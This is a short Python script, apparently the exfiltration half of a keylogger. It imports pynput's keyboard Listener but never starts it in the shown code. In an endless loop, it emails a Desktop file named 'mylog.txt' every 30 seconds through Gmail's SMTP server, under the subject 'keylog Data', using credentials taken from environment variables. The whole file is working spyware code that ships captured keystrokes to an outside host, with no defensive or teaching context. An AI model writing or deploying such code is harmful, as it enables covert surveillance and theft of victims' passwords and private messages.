from pynput.keyboard import Listener
import logging, time
from shutil import copyfile
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


EMAIL_ADDRESS = os.environ.get("DEVMAIL_ADDRESS")
EMAIL_PASSWORD = os.environ.get("DEVMAIL_PASSWORD")

def send_mail():
    username = os.getlogin()
    subject = 'keylog Data'
    msg = MIMEMultipart()

    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_ADDRESS
    msg['Subject'] = subject
    body = 'Here, is the logging data that you kept on check!'
    msg.attach(MIMEText(body,'plain'))
    filename = 'mylog.txt'
    attachment = open(f"C:/Users/{username}/Desktop/{filename}",'rb')

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition','attachment; filename= '+filename)
    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.ehlo()
    server.starttls()
    server.ehlo()
    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
    server.sendmail(EMAIL_ADDRESS,EMAIL_ADDRESS,text)
    print('Hey Email Has Been Sent')
    server.quit()

while(True):
    time.sleep(30)
    send_mail()
